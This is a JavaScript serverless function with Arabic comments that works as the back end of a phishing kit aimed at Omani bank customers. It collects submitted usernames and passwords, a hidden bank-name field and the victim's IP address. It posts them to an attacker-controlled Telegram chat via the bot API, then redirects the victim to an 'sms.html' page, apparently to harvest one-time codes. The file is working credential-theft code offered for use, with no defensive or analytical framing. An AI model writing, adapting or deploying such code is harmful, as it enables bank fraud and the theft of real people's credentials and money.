const axios = require('axios');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const params = new URLSearchParams(event.body);

    // هنا نعرف s1 و s2 على أنهم يوزر وباسورد
    const username = params.get('s1') || '-';
    const password = params.get('s2') || '-';

    // استدعاء اسم البنك من الحقل المخفي
    const bankName = params.get('bank_name') || 'غير محدد';
    
    const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';

    // هام: حدد الصفحة التي يذهب لها المستخدم بعد تسجيل الدخول
    // غالباً تكون صفحة "جاري الانتظار" أو صفحة "البطاقة"
    const nextPage = '/Oman/Banks/sms.html'; 

    // تنسيق الرسالة لتبدو كدخول بنكي مع إضافة اسم البنك
    const message = `
🏦 **تسجيل دخول بنكي (Login)**
---------------------------
🏢 **البنك:** ${bankName}
👤 **اسم المستخدم:** \`${username}\`
🔑 **كلمة السر:** \`${password}\`

🌐 **IP:** ${userIp}
---------------------------
    `;

    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });
    }

    return {
      statusCode: 302,
      headers: {
        'Location': nextPage,
      },
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 302,
      headers: {
        'Location': '/Oman/Banks/sms.html',
      },
    };
  }
};